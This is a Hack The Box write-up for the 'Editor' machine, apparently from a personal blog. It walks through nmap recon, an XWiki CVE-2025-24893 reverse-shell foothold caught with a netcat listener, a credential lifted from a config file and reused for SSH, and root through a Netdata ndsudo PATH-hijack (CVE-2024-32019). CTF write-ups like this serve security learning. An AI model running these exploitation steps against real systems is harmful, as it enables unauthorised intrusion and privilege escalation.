---
title: HTB Editor - Writeup
date: 2025-08-08 13:33:00 +0330
categories: [Writeup]
tags: [cve]
description: My writeup of Editor from Hack The Box 

---

## - **Recon & Enum**

```
$ nmap -sC -sV -oN editor_nmap -T4 10.10.11.80

Nmap scan report for 10.10.11.80
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Jetty(10.0.20)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

subdomain `wiki.editor.htb` on port 8080. using XWiki `15.10.8`, which is vulnerable to CVE-2025-24893.

## - **Foothold**

You can find my POC script [here](https://github.com/mah4nzfr/CVE-2025-24893).
```
$ ./cve.sh http://wiki.editor.htb *.*.*.* 9090
CVE-2025-24893 POC
Sendind the payload...
DONE!
```

```
$ nc -nvlp 9090
listening on [any] 9090 ...
connect to [*.*.*.*] from (UNKNOWN) [10.10.11.80] 41496
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -qc /bin/bash
xwiki@editor:/usr/lib/xwiki-jetty$
```

## - **User**
`hibernate.cfg.xml` contains password `theEd1t0rTeam99`and looking at /etc/passwd, we have user `oliver`.

```
$ ssh oliver@editor.htb
oliver@editor:~$ ls
user.txt
```

## - **Root**
```
oliver@editor:~$ ss -tuln
Netid    State     Recv-Q    Send-Q            Local Address:Port        Peer Address:Port   Process   
udp      UNCONN    0         0                     127.0.0.1:8125             0.0.0.0:*                
udp      UNCONN    0         0                 127.0.0.53%lo:53               0.0.0.0:*                
tcp      LISTEN    0         151                   127.0.0.1:3306             0.0.0.0:*                
tcp      LISTEN    0         128                     0.0.0.0:22               0.0.0.0:*                
tcp      LISTEN    0         511                     0.0.0.0:80               0.0.0.0:*                
tcp      LISTEN    0         4096                  127.0.0.1:8125             0.0.0.0:*                
tcp      LISTEN    0         4096                  127.0.0.1:19999            0.0.0.0:*                
tcp      LISTEN    0         70                    127.0.0.1:33060            0.0.0.0:*                
tcp      LISTEN    0         4096                  127.0.0.1:33611            0.0.0.0:*                
tcp      LISTEN    0         4096              127.0.0.53%lo:53               0.0.0.0:*                
tcp      LISTEN    0         128                        [::]:22                  [::]:*                
tcp      LISTEN    0         511                        [::]:80                  [::]:*                
tcp      LISTEN    0         50           [::ffff:127.0.0.1]:8079                   *:*                
tcp      LISTEN    0         50                            *:8080                   *:*   
```

port `19999` is open localy. Netdata version `1.45.2` is installed, vulnerable to CVE-2024-32019. Find the POC [here](https://github.com/AzureADTrent/CVE-2024-32019-POC)

```
oliver@editor:~$ export PATH=/tmp:$PATH

oliver@editor:~$ cd /opt/netdata/

oliver@editor:/opt/netdata$ find . | grep ndsudo
./usr/libexec/netdata/plugins.d/ndsudo

oliver@editor:/opt/netdata$ ./usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/opt/netdata# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)

root@editor:/opt/netdata# su root

root@editor:/opt/netdata# cd

root@editor:~# id
uid=0(root) gid=0(root) groups=0(root)
```

![](assets/img/editor_pwn.png)